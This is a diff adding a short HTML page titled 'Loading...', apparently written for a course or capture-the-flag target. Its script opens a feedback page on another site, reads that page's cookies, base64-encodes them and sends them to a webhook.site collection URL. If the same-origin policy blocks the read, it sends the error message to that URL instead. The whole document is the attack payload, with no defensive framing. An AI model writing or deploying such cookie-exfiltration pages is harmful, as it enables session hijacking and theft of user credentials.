@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+    <script>
+        const targetWindow = window.open('https://cats.is-course.ru/feedback');
+
+        setTimeout(() => {
+            try {
+                const cookies = targetWindow.document.cookie;
+                
+                fetch('https://webhook.site/73eba6ce-9315-4c03-b5cb-76defa0b6a1a' + btoa(cookies));
+            } catch (e) {
+                // Если сработал CORS/SOP защита, отправляем ошибку для отладки
+                fetch('https://webhook.site/73eba6ce-9315-4c03-b5cb-76defa0b6a1a' + btoa(e.message));
+            }
+        }, 1500);
+    </script>
+</body>
+</html>
